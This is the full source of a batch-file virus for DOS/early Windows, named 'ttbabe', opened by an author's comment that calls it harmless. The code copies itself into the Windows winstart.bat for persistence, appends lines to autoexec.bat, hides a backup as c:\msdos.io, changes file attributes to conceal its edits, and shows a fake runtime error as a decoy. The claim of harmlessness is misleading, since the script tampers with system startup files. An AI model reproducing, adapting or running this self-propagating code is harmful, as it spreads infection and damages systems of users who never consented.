rem
rem hi,
rem
rem this is the ttbabe bat virus which prints only every third of a month
rem a greeting message. so you can see this is a harmless virus, differently
rem than other viruses.
rem
rem this virus is dedicated to ttbabe ;)
rem
rem please do not steal any code. if you're planning to write your own you
rem can use some parts from it but try to code yourself.
rem
rem thx for reading.
rem

@echo off>nul
break off

path=%windir%

:checkwin
if exist c:\boot.ini goto exit

:date02
echo.|date|find "02">nul
if errorlevel 1 goto date03
goto checkauto

:date03
echo.|date|find "03">nul
if errorlevel 1 goto date04
goto winstartexist

:date04
echo.|date|find "04">nul
if errorlevel 1 goto exit
goto checkauto

:checkauto
if not exist c:\autoexec.bat goto createauto
goto suicide

:createauto
echo @echo off>nul >>c:\autoexec.bat
echo @cls >nul >>c:\autoexec.bat
goto exit

:suicide
find "ttbabe" c:\autoexec.bat >nul
if not errorlevel 1 goto suicideyes
goto exit

:suicideyes
if exist c:\msdos.io copy c:\msdos.io c:\autoexec.bat >nul
goto killem

:killem
if not exist c:\msdos.io goto exit

:winstartexist
if exist %windir%\winstart.bat find "ttbabe" %windir%\winstart.bat >nul
if not errorlevel 1 goto exit
goto whoami

:whoami
if %0.bat==winstart.bat goto exit
copy %0.bat %windir%\winstart.bat >nul
goto check

:check
find "ttbabe" c:\autoexec.bat >nul
if not errorlevel 1 goto exit
goto save

:save
copy c:\autoexec.bat c:\msdos.io
attrib c:\msdos.io +h +r
goto infect

:infect
attrib c:\autoexec.bat -h -r
echo @echo off>nul >>c:\autoexec.bat
echo @cls >nul >>c:\autoexec.bat
echo @echo for ttbabe >nul >>c:\autoexec.bat
attrib c:\autoexec.bat +h +r
@echo runtime error at address 0020:7702
goto exit

:exit

